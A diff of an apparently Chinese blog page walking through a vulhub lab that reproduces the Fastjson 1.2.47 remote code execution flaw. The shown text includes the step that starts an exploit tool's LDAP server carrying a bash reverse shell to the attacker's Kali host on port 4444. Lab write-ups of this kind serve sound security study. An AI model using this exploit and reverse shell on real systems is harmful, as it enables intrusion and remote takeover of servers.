@@ -118,6 +118,7 @@
 <li>Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)</li>
 </ul>
 <h3 id="Centos7上执行操作"><a href="#Centos7上执行操作" class="headerlink" title="Centos7上执行操作"></a>Centos7上执行操作</h3><p>1、下载vulhub漏洞环境<br>git clone <a href="https://github.com/vulhub/vulhub.git" target="_blank" rel="noopener">https://github.com/vulhub/vulhub.git</a><br>2、安装docker、docker-compose<br>3、进入fastjson 1.2.47的目录<br>我这里是/root/vulhub-master/fastjson/1.2.47-rce</p>
+<p><img src="https://raw.githubusercontent.com/jeansgit/jeansgit.github.io/master/css/images/fastjson1.png" alt></p>
 <p>4、执行docker-compose build &amp;&amp; docker-compose up -d启动漏洞环境<br>5、访问漏洞环境<br><a href="http://192.168.96.128:8090/" target="_blank" rel="noopener">http://192.168.96.128:8090/</a></p>
 <h3 id="Kali上执行操作"><a href="#Kali上执行操作" class="headerlink" title="Kali上执行操作"></a>Kali上执行操作</h3><p>1、下载漏洞利用工具fastjson_rce_tool<br>Git clone <a href="https://github.com/wyzxxz/fastjson_rce_tool" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
 <p>2、开启LDAP服务<br>java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.96.129 80 “bash=/bin/bash -i &gt;&amp; /dev/tcp/192.168.96.129/4444 0&gt;&amp;1”</p>
